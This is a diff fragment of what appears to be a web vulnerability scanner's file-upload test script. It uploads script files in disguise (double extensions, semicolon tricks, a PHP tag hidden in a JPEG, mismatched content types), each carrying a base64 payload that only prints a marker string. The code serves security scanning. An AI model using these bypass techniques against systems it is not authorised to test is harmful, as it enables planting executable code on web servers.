+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".php.ajpg", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEARwBHAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAEAAQAwEiAAIRAQMRAf/EABYAAQEBAAAAAAAAAAAAAAAAAAQAAf/EACIQAAEEAgEEAwAAAAAAAAAAAAIBAwQFBhEHABITMSFBYf/EABUBAQEAAAAAAAAAAAAAAAAAAAQH/8QAIhEBAAECBAcAAAAAAAAAAAAAERIAEwMEFUEiJTJCYqGx/9oADAMBAAIRAxEAPwB1CxxdV8a01pk9Lb3OQ2kmajcaHZymyMQlutivaDqCKIIiKaT5169r1t9H4utONLm1xelt6bIauTCRyNMs5ThNi5LabJe03VEkUSIV2nxv16XovHzvH7IVFhkmT2tfMhx7CG/EYqZZkPklSDbcbeBshRex7e039fvVyA7x+63cWGN5Ra2EybHr4jEN+plgReKVHNxxx420FV7Gd7XX3+dI5vqvfC55BL5VPhlmLiXVeIZ9IAb+9q//2Q=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(13, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".asp", "image/jpeg", b642plain("PCUgUmVzcG9uc2UuV3JpdGUoIjRkMDIwNzBlZmZkZDdlMzE5IiArICJjYTU2MWJjNjY2MTdhOGEiKSAlPg=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(14, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".aspx", "image/png", b642plain("PHNjcmlwdCBydW5hdD0ic2VydmVyIiBsYW5ndWFnZT0iQyMiPg0Kdm9pZCBQYWdlX0xvYWQob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpew0KICBSZXNwb25zZS5Xcml0ZSgiNGQwMjA3MGVmZmRkN2UzMTkiICsgImNhNTYxYmM2NjYxN2E4YSIpOw0KfQ0KPC9zY3JpcHQ+DQo="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(15, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".asp", "text/plain", b642plain("PCUgUmVzcG9uc2UuV3JpdGUoIjRkMDIwNzBlZmZkZDdlMzE5IiArICJjYTU2MWJjNjY2MTdhOGEiKSAlPg=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(16, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".asp;.jpg", "image/jpeg", b642plain("PCUgUmVzcG9uc2UuV3JpdGUoIjRkMDIwNzBlZmZkZDdlMzE5IiArICJjYTU2MWJjNjY2MTdhOGEiKSAlPg=="), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(17, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".jsp", "image/jpeg", b642plain("PCUgb3V0LnByaW50KCI0ZDAyMDcwZWZmZGQ3ZTMxOSIgKyAiY2E1NjFiYzY2NjE3YThhIik7ICU+"), "4d02070effdd7e319ca561bc66617a8a")) return;
+				ScriptProgress(ComputeProgress(18, numberTests));
+				if (this.TestFileUpload("AcuTest" + random(maxRandomNumber) + ".jpg", "image/jpeg", b642plain("/9j/4AAQSkZJRgABAQEASABIAAD//gAyPD9waHAgZWNobyhtZDUoJ2FjdW5ldGl4LWZpbGUtdXBsb2FkLXRlc3QnKSk7ID8+/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgAAQABAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAI/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCywAf/2Q=="), "4d02070effdd7e319ca561bc66617a8a", 1)) return;
+				ScriptProgress(ComputeProgress(19, numberTests));	
+			}
+			
+			else 
+			{
+				// no upload directory, we are out.
+				ScriptProgress(ComputeProgress(numberTests, numberTests));
+			}
+		}
+	}
+}	
+// main entry point 
+var tester = new classFileUpload(scheme);
+tester.startTesting();
